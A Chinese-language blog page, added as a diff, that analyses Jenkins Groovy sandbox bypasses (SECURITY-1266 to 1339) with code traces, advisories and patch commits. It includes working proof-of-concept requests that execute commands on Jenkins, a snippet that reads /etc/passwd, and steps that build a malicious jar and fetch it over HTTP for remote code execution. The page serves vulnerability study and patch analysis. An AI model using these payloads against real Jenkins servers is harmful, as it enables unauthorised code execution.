@@ -1,0 +1,879 @@
+<!DOCTYPE html>
+<html lang="zh_cn">
+
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+<meta name="description" content="一个孤独散步者的梦">
+
+
+<meta property="twitter:title" content="Jenkins 路由解析及沙箱绕过漏洞分析报告(下)">
+
+    <meta property="twitter:card" content="summary">
+
+<meta property="twitter:description" content="">
+
+<title>
+
+
+     诗与胡说 - Jenkins 路由解析及沙箱绕过漏洞分析报告(下) 
+
+</title>
+<link rel="canonical" href="https://kylingit.com/blog/jenkins-%E8%B7%AF%E7%94%B1%E8%A7%A3%E6%9E%90%E5%8F%8A%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A%E4%B8%8B/">
+
+
+<link rel="stylesheet" href="https://kylingit.com/css/main.v0.9.1.css">
+<link rel="stylesheet" href="https://kylingit.com/css/ionicons.min.css">
+
+
+  <link rel="stylesheet" href="https://kylingit.com/css/highlight.min.css">
+
+
+
+  <link rel="stylesheet" href="https://kylingit.com/css/progressively.min.css">
+
+
+
+
+
+<link rel="shortcut icon"
+
+    href="https://kylingit.com/img/favicon.png"
+
+>
+
+
+
+
+</head>
+
+
+<body>
+
+
+<section class="header">
+
+    <div class="container">
+        <a href="https://kylingit.com/"><img class="logo" src="https://kylingit.com/img/logo.jpg" alt="logo" /></a>
+        <div class="content">
+            <a href="https://kylingit.com/"><div class="name"><h1>诗与胡说</h1></div></a>
+            <nav>
+                <ul>
+                    
+                        <a href="https://kylingit.com/blog/"><li>Blog</li></a>
+                    
+                    
+                        
+                    
+                        
+                            
+                            <a href="https://kylingit.com/about"><li>about</li></a>
+                            
+                        
+                    
+                        
+                            
+                        
+                    
+                        
+                            
+                            <a href="https://kylingit.com/projects"><li>projects</li></a>
+                            
+                        
+                    
+                    
+                        
+                            <a href="https://kylingit.com/notes/"><li>notes</li></a>
+                        
+                    
+                        
+                    
+                </ul>
+            </nav>
+        </div>
+    </div>
+</section>
+
+
+<section class="main post non-narrow zero-top-spacing">
+    <div class="container">
+        <div class="content">
+            <div class="front-matter">
+                <div class="title-container">
+                    <div class="page-heading">
+
+    Jenkins 路由解析及沙箱绕过漏洞分析报告(下)
+
+</div>
+
+                </div>
+                <div class="meta">
+                    <div class="date" title="Wed Sep 16 2020 11:48:32 UTC">Sep 16, 2020</div>
+                    <div class="reading-time"><div class="middot"></div>4 minutes read</div>
+                </div>
+            </div>
+            <div class="markdown">
+                
+    
+    
+
+<script src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js"></script>
+
+<h1 id="jenkins-路由解析及沙箱绕过漏洞分析报告-下">Jenkins 路由解析及沙箱绕过漏洞分析报告(下)</h1>
+
+<p><img src="https://jenkins.io/images/logo-title-opengraph.png" alt="" /></p>
+
+<p>本报告下篇分析Jenkins主流插件Script Security中针对Groovy沙箱的绕过方法，梳理了Jenkins官方2018-2019年以来涉及沙箱绕过的安全更新，探讨Java沙箱在Java应用中的安全性。</p>
+
+<h2 id="突破groovy沙箱">突破Groovy沙箱</h2>
+
+<p>借用@廖新喜在2019 KCon大会的议题<a href="https://github.com/knownsec/KCon/blob/master/2019/24%E6%97%A5/Java%E7%94%9F%E6%80%81%E5%9C%88%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AE%9E%E6%88%98.pdf">《Java生态圈沙箱逃逸实战》</a>中的一张图，概括了Groovy沙箱的绕过史</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1570866330294.png" alt="1570866330294" /></p>
+
+<p>下面按照官方发布的安全更新先后顺序梳理在Script Security插件中出现的沙箱绕过漏洞</p>
+
+<h3 id="security-1266">SECURITY-1266</h3>
+
+<ul>
+<li>公告：<a href="https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266">https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266</a></li>
+<li>CVE：CVE-2019-1003000</li>
+<li>插件：Script Security</li>
+<li>影响版本：&lt;=1.49</li>
+<li>利用点
+
+<ul>
+<li><code>org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript#DescriptorImpl</code></li>
+<li><code>org.jenkinsci.plugins.workflow.cps#CpsFlowDefinition</code></li>
+</ul></li>
+</ul>
+
+<h4 id="分析">分析</h4>
+
+<p>DescriptorImpl继承自Descriptor，通过上面的利用链能调用到这个descriptor并且能指定调用方法，同时这个类的<code>doCheckScript</code>方法对Groovy脚本进行了解析，又根据上文的分析我们可以调用到任意<code>do</code>方法，因此这个过程可以控制传入的脚本内容进而绕过沙箱执行代码</p>
+
+<p>下面是分析GroovyShell解析脚本的过程，不感兴趣的可以略过</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1566973312540.png" alt="1566973312540" /></p>
+
+<p>通过<code>parse()</code>方法解析Groovy脚本，经过一系列调用后进入<code>GroovyClassLoader#doParseClass()</code>方法，在该方法中的<code>unit.compile(goalPhase);</code>完成解析</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568882770356.png" alt="1568882770356" /></p>
+
+<p>其中<code>goalPhase</code>记录了当前解析的阶段，相关定义在<code>org.codehaus.groovy.control.Phases</code>，可以看到在Groovy compile的时候共有9个阶段，其中<code>ALL</code>和<code>FINALIZATION</code>定义是一样的</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568881838677.png" alt="1568881838677" /></p>
+
+<p>从注释也能看出来，分别是</p>
+
+<ol>
+<li><strong><em>初始化</em></strong>：打开源文件并配置环境；</li>
+<li><strong><em>解析</em></strong>：语法用于生成代表源代码的令牌树；</li>
+<li><strong><em>转换</em></strong>：从标记树创建抽象语法树（AST）；</li>
+<li><strong><em>语义分析</em></strong>：执行语法无法检查的一致性和有效性检查，并解析类；</li>
+<li><strong><em>规范化</em></strong>：完成AST的构建；</li>
+<li><strong><em>指令选择</em></strong>：选择指令集，例如Java 6或Java 7字节码级别；</li>
+<li><strong><em>类生成</em></strong>：在内存中创建*类*的字节码；</li>
+<li><strong><em>输出</em></strong>：将二进制输出写入文件系统；</li>
+<li><strong><em>完成</em></strong>：执行任何最后的清理；</li>
+</ol>
+
+<p>跟入<code>CompilationUnit#compile()</code></p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568965892472.png" alt="1568965892472" /></p>
+
+<p>可以看到当执行到阶段4时会先调用doPhaseOperation()方法，然后继续<code>processPhaseOperations()</code>和<code>processNewPhaseOperations()</code>操作，接着如果<code>progressCallback</code>不为空的话会去调用回调函数，当第一次进行到阶段4的时候，会设置progressCallback为<code>ASTTestTransformation</code>，接下来的阶段progressCallback都为这个值，直到执行到设置好的阶段7。</p>
+
+<p>在执行progressCallback.call，即调用到<code>ASTTestTransformation#visit()</code>的过程中，会再次调用到<code>GroovyShell#evaluate()</code>，随后再次进入parse的流程，这是一个递归的过程，也就是说从阶段4到阶段7一共会执行4次parse，每次parse完成通过<code>script.run()</code>执行代码</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568971024024.png" alt="1568971024024" /></p>
+
+<p>本地测试一下，打印出每次执行到的阶段，可以看到对ASTTest的解析会涉及到阶段4到阶段7</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568971437485.png" alt="1568971437485" /></p>
+
+<blockquote>
+<p>一个tips：</p>
+
+<p>@ASTTest有两个参数，其中*phase*可以指定ASTTest执行的阶段，在该阶段结束时作用于AST树</p>
+
+<p>参考：<a href="https://groovy-lang.org/metaprogramming.html#xform-ASTTest">https://groovy-lang.org/metaprogramming.html#xform-ASTTest</a></p>
+</blockquote>
+
+<p>因此，通过<code>@ASTTest</code>语法可以利用断言执行代码，这个过程发生在Groovy解析脚本的过程中，而不用等到具体调用再执行</p>
+
+<h4 id="poc">PoC</h4>
+
+<pre><code>GET /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=import%20groovy.transform.*%0a@ASTTest(value={assert%20java.lang.Runtime.getRuntime().exec(&quot;calc&quot;)})%0aclass%20ASTTestPoc{}
+</code></pre>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1566962122229.png" alt="1566962122229" /></p>
+
+<h4 id="补丁">补丁</h4>
+
+<ul>
+<li>jenkinsci/script-security-plugin <a href="https://github.com/jenkinsci/script-security-plugin/commit/2c5122e50742dd16492f9424992deb21cc07837c">commit</a></li>
+<li>版本：1.50</li>
+<li>概述：新增RejectASTTransformsCustomizer类，拦截ASTTest.class和Grab.class，出现这两个语法会抛出异常</li>
+</ul>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568605407294.png" alt="1568605407294" /></p>
+
+<h3 id="security-1292">SECURITY-1292</h3>
+
+<ul>
+<li>公告：<a href="https://jenkins.io/security/advisory/2019-01-28/#SECURITY-1292">https://jenkins.io/security/advisory/2019-01-28/#SECURITY-1292</a></li>
+<li>CVE：CVE-2019-1003005</li>
+<li>插件：Script Security Plugin</li>
+<li>版本：&lt;=1.50</li>
+</ul>
+
+<blockquote>
+<p>Script Security sandbox protection could be circumvented during the script compilation phase by applying AST transforming annotations such as <code>@Grab</code> to source code elements.</p>
+
+<p>This affected an HTTP endpoint used to validate a user-submitted Groovy script that was not covered in the <a href="https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266">2019-01-08 fix for SECURITY-1266</a> and allowed users with Overall/Read permission to bypass the sandbox protection and execute arbitrary code on the Jenkins master.</p>
+</blockquote>
+
+<p><code>org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript#DescriptorImpl</code>利用链中的<code>doCheckScript</code>方法没有及时更新修复后的安全方法，依然存在风险，绕过点就是利用<code>@Grab</code></p>
+
+<p><code>Grape</code> 是一个内嵌在 Groovy 中的 JAR 依赖项管理器，方便在classpath中快速添加 Maven 库依赖项，更易于编写脚本。最简单的用法是在脚本上添加注释（annotation），如下所示：</p>
+
+<pre><code class="language-java">@Grab(group='org.springframework', module='spring-orm', version='3.2.5.RELEASE')
+import org.springframework.jdbc.core.JdbcTemplate
+</code></pre>
+
+<p>程序会自动去仓库下载对应的库，并保存在<code>~/.groovy/grapes/</code>目录</p>
+
+<h4 id="分析-1">分析</h4>
+
+<p>现在只需找到一个可以利用的类便可完成代码执行，这里列举两个：</p>
+
+<p><code>org.zeroturnaround.zt-exec</code>类，本地测试</p>
+
+<pre><code class="language-java">@Grab('org.zeroturnaround:zt-exec:1.11')
+import org.zeroturnaround.exec.ProcessExecutor
+new ProcessExecutor().command(&quot;calc&quot;).execute()
+</code></pre>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1570780489674.png" alt="1570780489674" /></p>
+
+<p>除此之外，<a href="adamyordan/cve-2019-1003000-jenkins-rce-poc">adamyordan/cve-2019-1003000-jenkins-rce-poc</a>利用了<code>org.buildobjects.process.ProcBuilder</code>类，效果是一样的</p>
+
+<pre><code class="language-java">import org.buildobjects.process.ProcBuilder
+@Grab('org.buildobjects:jproc:2.2.3')
+class Dummy{ }
+print new ProcBuilder(&quot;/bin/bash&quot;).withArgs(&quot;-c&quot;,&quot;cat /etc/passwd&quot;).run().getOutputString()
+</code></pre>
+
+<p>但是，在Jenkins中执行并不能正常触发，报错如下：</p>
+
+<pre><code>Caused by: java.lang.RuntimeException: No suitable ClassLoader found for grab
+        at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
+        at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
+        at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
+        at java.lang.reflect.Constructor.newInstance(Constructor.java:423)
+        at org.codehaus.groovy.reflection.CachedConstructor.invoke(CachedConstructor.java:83)
+        at org.codehaus.groovy.runtime.callsite.ConstructorSite$ConstructorSiteNoUnwrapNoCoerce.callConstructor(ConstructorSite.java:105)
+        at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCallConstructor(CallSiteArray.java:60)
+        at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callConstructor(AbstractCallSite.java:235)
+        at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callConstructor(AbstractCallSite.java:247)
+        at groovy.grape.GrapeIvy.chooseClassLoader(GrapeIvy.groovy:182)
+        at groovy.grape.GrapeIvy$chooseClassLoader.callCurrent(Unknown Source)
+        at groovy.grape.GrapeIvy.grab(GrapeIvy.groovy:249)
+        at groovy.grape.Grape.grab(Grape.java:167)
+        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
+        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+        at java.lang.reflect.Method.invoke(Method.java:498)
+        at org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:93)
+        at groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:325)
+        at org.codehaus.groovy.runtime.callsite.StaticMetaMethodSite.invoke(StaticMetaMethodSite.java:46)
+        at org.codehaus.groovy.runtime.callsite.StaticMetaMethodSite.callStatic(StaticMetaMethodSite.java:102)
+        at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCallStatic(CallSiteArray.java:56)
+        at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callStatic(AbstractCallSite.java:194)
+        at org.kohsuke.groovy.sandbox.impl.Checker$2.call(Checker.java:188)
+        at org.kohsuke.groovy.sandbox.impl.Checker.checkedStaticCall(Checker.java:190)
+        at org.kohsuke.groovy.sandbox.impl.Checker$checkedStaticCall$0.callStatic(Unknown Source)
+        at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCallStatic(CallSiteArray.java:56)
+        at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callStatic(AbstractCallSite.java:194)
+        at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callStatic(AbstractCallSite.java:222)
+        at Script1.&lt;clinit&gt;(Script1.groovy)
+        ... 95 more
+</code></pre>
+
+<p>下面针对这个异常来分析@grab的执行流程，不感兴趣的可以略过</p>
+
+<p><code>@grab</code>的解析与上面<code>@ASTTest</code>类似，同样是9个阶段，不同的是解析ASTTest时回调的是<code>ASTTestTransformation</code>而grab回调的是<code>GrabAnnotationTransformation#visit()</code>，进而执行到<code>groovy.grape.Grape#grab</code></p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1571037111326.png" alt="1571037111326" /></p>
+
+<p>最终的实现由<code>groovy.grape.GrapeIvy#grab</code>来完成，<a href="https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/GrapeIvy.groovy#L242">源码</a></p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1571037984228.png" alt="1571037984228" /></p>
+
+<p>在这个过程中会通过两次<code>chooseClassLoader</code>来加载class，当class以及其父类不属于<code>groovy.lang.GroovyClassLoader</code>或者<code>org.codehaus.groovy.tools.RootLoader</code>时会抛出<code>No suitable ClassLoader found for grab</code></p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1571047376914.png" alt="1571047376914" /></p>
+
+<p>通过<code>Matrix Project Plugin</code>插件来跟踪流程，该插件的<code>Combination Filter</code>功能可以进行groovy解析，这个地方也披露过一个沙箱绕过漏洞，具体分析请参考下文[SECURITY-1339]{#SECURITY-1339}</p>
+
+<p>当用户从Configuration Matrix页面上保存配置时，调用如下</p>
+
+<pre><code class="language-java">public Script parse(GroovyCodeSource codeSource) throws CompilationFailedException {
+    return InvokerHelper.createScript(this.parseClass(codeSource), this.context);
+}
+</code></pre>
+
+<p>在执行<code>createScript()</code>和<code>parseClass()</code>两个方法时都会对grab进行解析，但参数有所不同</p>
+
+<p><code>parseClass()</code>过程传递的参数<code>classLoader</code>为<code>GroovyClassLoader</code>，因此能够正常加载，即一次成功的grab解析过程</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1571046450490.png" alt="1571046450490" /></p>
+
+<p><code>createScript()</code>过程的args参数不含<code>classLoader</code>，于是Jenkins会加载当前插件类<code>script-security</code>，不属于上面提到的<code>groovy.lang.GroovyClassLoader</code>或者<code>org.codehaus.groovy.tools.RootLoader</code>，所以会抛出<code>No suitable ClassLoader found for grab</code>异常，但是恶意代码已经在第一次解析的时候触发了</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1571051122801.png" alt="1571051122801" /></p>
+
+<p>两次调用栈对比</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1571051029984.png" alt="1571051029984" /></p>
+
+<p>接下来当成功获取到<code>loader</code> 后会通过下面两个方法开始解析具体的jar文件，重点关注<code>processOtherServices()</code></p>
+
+<ul>
+<li>processCategoryMethods()</li>
+<li>processOtherServices()</li>
+</ul>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1571051322541.png" alt="1571051322541" /></p>
+
+<p>可以看到在<code>processRunners()</code>中有 <code>newInstance()</code>方法，当我们把<code>META-INF/services/org.codehaus.groovy.plugins.Runners</code>设置成恶意类时，Grape就会以这个类为入口点，即可创建这个类的实例，这也就是Orange在<a href="https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/">Hacking Jenkins Part 2</a>中提到要将执行的类名放到该路径下的原因：</p>
+
+<blockquote>
+<p>這裡的 <code>newInstance()</code> 不就代表著可以呼叫到任意類別的 <code>Constructor</code> 嗎? 沒錯! 所以只需產生一個惡意的 JAR 檔，把要執行的類別全名放至 <code>META-INF/services/org.codehaus.groovy.plugins.Runners</code> 中即可呼叫指定類別的<code>Constructor</code> 去執行任意代碼!</p>
+</blockquote>
+
+<p>因此该漏洞的触发方式是，使用@grab引入外部jar文件，并且jar包中的<code>META-INF/services/org.codehaus.groovy.plugins.Runners</code>内容为要执行的类名，通过<code>GroovyShell.parse</code>即可触发。</p>
+
+<h4 id="poc-1">PoC</h4>
+
+<p>需要额外创建恶意jar包并放在<code>~/.groovy/grapes/jars</code>目录，较鸡肋，配合<code>@GrabResolver</code>从远程获取恶意类更方便触发，详细分析参考[SECURITY-1319]{#SECURITY-1319}</p>
+
+<h4 id="补丁-1">补丁</h4>
+
+<ul>
+<li><p>jenkinsci/script-security-plugin <a href="https://github.com/jenkinsci/script-security-plugin/commit/35119273101af26792457ec177f34f6f4fa49d99">commit</a></p></li>
+
+<li><p>版本：1.51</p></li>
+
+<li><p>概述：在1.50的修复中新增了一个<code>RejectASTTransformsCustomizer</code>类用来拦截黑名单，但是在<code>SecureGroovyScript#DescriptorImpl</code>的<code>doCheckScript()</code>方法中并没有调用，在该版本修改了直接parse的过程</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1570781824987.png" alt="1570781824987" /></p>
+
+<p>createSecureCompilerConfiguration()方法即在<a href="https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266">SECURITY-1266</a>中新增的修复方法</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1570782051460.png" alt="1570782051460" /></p></li>
+</ul>
+
+<h3 id="security-1318">SECURITY-1318</h3>
+
+<p><code>@Grapes</code>可以进行多重注释，如</p>
+
+<pre><code class="language-java">@Grapes([
+   @Grab(group='commons-primitives', module='commons-primitives', version='1.0'),
+   @Grab(group='org.ccil.cowan.tagsoup', module='tagsoup', version='0.9.7')])
+class Example {
+// ...
+}
+</code></pre>
+
+<p>所以上面的<code>@Grab</code>可以放进<code>@Grapes</code>中，效果是一样的，以此来绕过黑名单</p>
+
+<h4 id="poc-2">PoC</h4>
+
+<pre><code class="language-java">@Grapes([@Grab('org.zeroturnaround:zt-exec:1.11'), @GrabConfig(systemClassLoader=false)])
+import org.zeroturnaround.exec.ProcessExecutor;
+new ProcessExecutor().command(&quot;calc&quot;).execute();
+</code></pre>
+
+<h3 id="security-1319">SECURITY-1319</h3>
+
+<p>使用<code>@GrabResolver</code>可以从指定仓库下载依赖文件，如</p>
+
+<pre><code class="language-java">@GrabResolver(name='restlet', root='http://maven.restlet.org/')
+@Grab(group='org.restlet', module='org.restlet', version='1.1.6')
+</code></pre>
+
+<p>这里的root可以指定任意地址，也就可以从远程获取恶意jar文件，这也是Orange在<a href="https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/">Hacking Jenkins Part 2</a>提到的方法</p>
+
+<h4 id="poc-3">PoC</h4>
+
+<ol>
+<li><p>编写执行命令的恶意类</p>
+
+<pre><code class="language-java">public class Exploit {
+    public Exploit() {
+        try {
+            String payload = &quot;calc&quot;;
+            String[] cmds = {&quot;cmd&quot;, &quot;/c&quot;, payload};
+            java.lang.Runtime.getRuntime().exec(cmds);
+        } catch (Exception e) {
+        }
+    }
+}
+</code></pre></li>
+
+<li><p>编译生成class</p>
+
+<pre><code class="language-java">javac Exploit.java
+</code></pre></li>
+
+<li><p>创建文件夹</p>
+
+<pre><code class="language-bash">mkdir -p META-INF/services/
+</code></pre></li>
+
+<li><p>将要执行的类名写入到<code>META-INF/services/org.codehaus.groovy.plugins.Runners</code> 中，原因见上文<code>@grab</code>的分析</p>
+
+<pre><code class="language-bash">echo Exploit &gt;META-INF/services/org.codehaus.groovy.plugins.Runners
+</code></pre></li>
+
+<li><p>打包成jar</p>
+
+<pre><code class="language-bash">jar cvf payload-1.jar Exploit.class META-INF/
+</code></pre></li>
+
+<li><p>创建目录，与最终poc中garb的group，module，version关联，如</p>
+
+<p><code>@Grab(group='exp',module='payload',version='1')</code></p>
+
+<p>则创建<code>exp/payload/1</code>目录</p></li>
+
+<li><p>把生成的jar文件放在<code>exp/payload/1</code>中，并开启一个http服务</p></li>
+
+<li><p>发送PoC</p>
+
+<pre><code>GET /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='payload',root='http://127.0.0.1:83/')%0a@Grab(group='exp',module='payload',version='1')%0aimport%20Exploit;
+</code></pre></li>
+
+<li><p>http响应并执行命令</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568259623884.png" alt="1568259623884" /></p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568259687132.png" alt="1568259687132" /></p></li>
+</ol>
+
+<p>注意：</p>
+
+<ol>
+<li>当通过grab拉取jar后会在<code>~/.groovy/grapes</code>目录创建相应的<code>ivy.xml</code>文件（类似于pom文件，保存依赖关系）和<code>jars</code>目录，当再次请求相同的包时会从本地获取jar文件而不会去请求http，如果要再次请求就需要更改包名或版本；</li>
+<li>还需要注意目标的Java版本与编译恶意类的Java版本是否一致，否则会报错；</li>
+</ol>
+
+<h3 id="security-1320">SECURITY-1320</h3>
+
+<ul>
+<li>CVE：CVE-2019-1003024</li>
+<li>插件：Script Security Plugin</li>
+<li>版本：&lt;=1.52</li>
+</ul>
+
+<p>补丁中对1320的<a href="https://github.com/jenkinsci/script-security-plugin/commit/3228c88e84f0b2f24845b6466cae35617e082059#diff-6f8c6ffbeca4d1d208c9c232770a644fR950">测试用例</a>提示了绕过方法，就是通过导入别名的方式</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1571124411948.png" alt="1571124411948" /></p>
+
+<h4 id="poc-4">PoC</h4>
+
+<pre><code class="language-java">import groovy.transform.ASTTest as lolwut;
+@lolwut(value={assert java.lang.Runtime.getRuntime().exec(&quot;calc&quot;)})
+class ASTTestPoc{};
+</code></pre>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1571125498965.png" alt="1571125498965" /></p>
+
+<h3 id="security-1321">SECURITY-1321</h3>
+
+<ul>
+<li>CVE：CVE-2019-1003024</li>
+<li>插件：Script Security Plugin</li>
+<li>版本：&lt;=1.52</li>
+</ul>
+
+<p>同样根据<a href="https://github.com/jenkinsci/script-security-plugin/commit/3228c88e84f0b2f24845b6466cae35617e082059#diff-6f8c6ffbeca4d1d208c9c232770a644fR921">测试用例</a>发现通过<code>元注释</code>来绕过</p>
+
+<p><a href="http://docs.groovy-lang.org/latest/html/api/groovy/transform/AnnotationCollector.html">文档</a>上的例子：</p>
+
+<pre><code class="language-java">import groovy.transform.*
+@AnnotationCollector([EqualsAndHashCode, ToString])
+@interface Simple {}
+
+@Simple
+class User {
+    String username
+    int age
+}
+
+def user = new User(username: 'mrhaki', age: 39)
+assert user.toString()
+</code></pre>
+
+<h4 id="poc-5">PoC</h4>
+
+<pre><code class="language-java">import groovy.transform.*;
+@AnnotationCollector([ASTTest])
+@interface Lol {}
+@Lol(value={assert java.lang.Runtime.getRuntime().exec(&quot;calc&quot;)})
+class ASTTestPoc{};
+</code></pre>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1571128442836.png" alt="1571128442836" /></p>
+
+<h4 id="补丁-2">补丁</h4>
+
+<ul>
+<li>jenkinsci/script-security-plugin <a href="https://github.com/jenkinsci/script-security-plugin/commit/3228c88e84f0b2f24845b6466cae35617e082059">commit</a></li>
+<li>版本：1.53</li>
+<li>概述：SECURITY-1318, SECURITY-1319, SECURITY-1320, SECURITY-1321均在1.53版本中修复，把Grab注释相关的方法全部放进了黑名单</li>
+</ul>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1570871810447.png" alt="1570871810447" /></p>
+
+<h3 id="security-1339">SECURITY-1339</h3>
+
+<ul>
+<li>公告：<a href="https://jenkins.io/security/advisory/2019-03-06/#SECURITY-1339">https://jenkins.io/security/advisory/2019-03-06/#SECURITY-1339</a></li>
+<li>CVE：CVE-2019-1003031</li>
+<li>插件：Matrix Project Plugin</li>
+<li>影响版本：&lt;= 1.13</li>
+</ul>
+
+<p>这个漏洞需要配合<a href="https://jenkins.io/security/advisory/2019-03-06/#SECURITY-1336%20(1)">SECURITY-1336 (1)</a> / CVE-2019-1003029触发，本质还是利用在解析groovy脚本后中通过script.run()执行代码</p>
+
+<h4 id="分析-2">分析</h4>
+
+<p>从页面提交Filter之后执行到<code>hudson.matrix.MatrixProject#submit()</code>，payload传给参数<code>combinationFilter</code>，随后执行<code>rebuildConfigurations</code></p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568687478328.png" alt="1568687478328" /></p>
+
+<p>payload传入<code>evalGroovyExpression</code>，然后调用<code>hudson.matrix.FilterScript#parse()</code>方法初始化一个GroovyShell，并通过GroovyShell解析表达式，代码得到执行</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568687517862.png" alt="1568687517862" /></p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568792862732.png" alt="1568792862732" /></p>
+
+<h4 id="poc-6">PoC</h4>
+
+<pre><code class="language-java">class poc{poc(){&quot;calc&quot;.execute()}}
+</code></pre>
+
+<h4 id="补丁-3">补丁</h4>
+
+<ul>
+<li>jenkinsci/script-security-plugin <a href="https://github.com/jenkinsci/script-security-plugin/commit/f2649a7c0757aad0f6b4642c7ef0dd44c8fea434">commit</a></li>
+<li>jenkinsci/matrix-project-plugin <a href="https://github.com/jenkinsci/matrix-project-plugin/commit/765fc39694b31f8dd6e3d27cf51d1708b5df2be7">commit</a></li>
+<li>概述：</li>
+</ul>
+
+<p>在SECURITY-1336的修复中，使用安全的方法</p>
+
+<pre><code class="language-java">GroovySandbox.run(GroovyShell, String, Whitelist)
+</code></pre>
+
+<p>代替</p>
+
+<pre><code class="language-java">GroovySandbox.run(Script, Whitelist)
+</code></pre>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568691589273.png" alt="1568691589273" /></p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568691613625.png" alt="1568691613625" /></p>
+
+<p>安全方法会在执行之前通过白名单检查，之后直接通过shell.parse会抛出一个java.lang.IllegalStateException的异常</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/1568691388339.png" alt="1568691388339" /></p>
+
+<h3 id="security-1465">SECURITY-1465</h3>
+
+<ul>
+<li>公告：<a href="https://jenkins.io/security/advisory/2019-07-31/#SECURITY-1465%20(2">https://jenkins.io/security/advisory/2019-07-31/#SECURITY-1465%20(2</a>)</li>
+<li>CVE：CVE-2019-10355, CVE-2019-10356</li>
+<li>插件：Script Security</li>
+<li>影响版本：&lt;=1.61</li>
+</ul>
+
+<h4 id="概述">概述</h4>
+
+<p>Groovy语法中的方法指针运算符<code>.&amp;</code>可以获取一个方法指针，后面再调用该指针可以直接访问到指定方法，如：</p>
+
+<pre><code class="language-java">void doSomething(def param) {
+    println &quot;In doSomething method, param: &quot; + param
+}
+def m = this.&amp;doSomething
+m(&quot;test param&quot;);
+</code></pre>
+
+<p>参考：<a href="http://docs.groovy-lang.org/latest/html/documentation/core-operators.html#method-pointer-operator">http://docs.groovy-lang.org/latest/html/documentation/core-operators.html#method-pointer-operator</a></p>
+
+<h4 id="分析-3">分析</h4>
+
